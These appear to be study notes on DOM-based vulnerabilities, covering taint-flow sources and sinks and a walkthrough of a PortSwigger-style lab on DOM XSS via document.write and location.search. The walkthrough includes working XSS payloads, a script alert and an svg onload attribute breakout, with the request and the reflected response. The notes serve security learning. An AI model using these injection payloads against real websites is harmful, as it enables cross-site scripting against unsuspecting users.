# DOM-based Vulns

</br>

## Taint flow - sources to sinks

DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

The most common source is the URL, which is typically accessed with the `location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL.

```js
goto = location.hash.slice(1) 
if (goto.startsWith('https:')) {   
location = goto; 
}
```

</br>

## Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

```
document.URL 
document.documentURI 
document.URLUnencoded
document.baseURI
location document.cookie 
document.referrer
window.name 
history.pushState
history.replaceState 
localStorage 
sessionStorage
IndexedDB (mozIndexedDB,
webkitIndexedDB, msIndexedDB) 
Database
```

</nr>

## DOM-based XSS
### Exploiting DOM XSS with different sources and sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. 
Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the [list](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities) below for details.

The `document.write` sink works with `script` elements, so you can use a simple payload, such as the one below:

```js
document.write('... <script>alert(document.domain)</script> ...');
```

</br>

## DOM XSS in ```document.write```  Sink using `location.search`

A DOM-based XSS is in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

The search term is processed by this JS
```js
 <script>
    function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
	var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
     trackSearch(query);
                        }
</script>
```

</br>

**I searched for `phone`**
and the search term lands inside a set of `<img src`  attribute 
```html
<img src="/resources/images/tracker.gif?searchTerms=phone">
```

</br>

_**Therefore, need to Break out of the `img` attribute by searching for:**_
```html
"><svg onload=alert(1)>
```

- Request
```http
GET /?search="><svg onload=alert(1)> 
```

- Inspect source code in Response
```html
<img src="/resources/images/tracker.gif?searchTerms=">
<svg onload="alert(1)">"&gt;
```
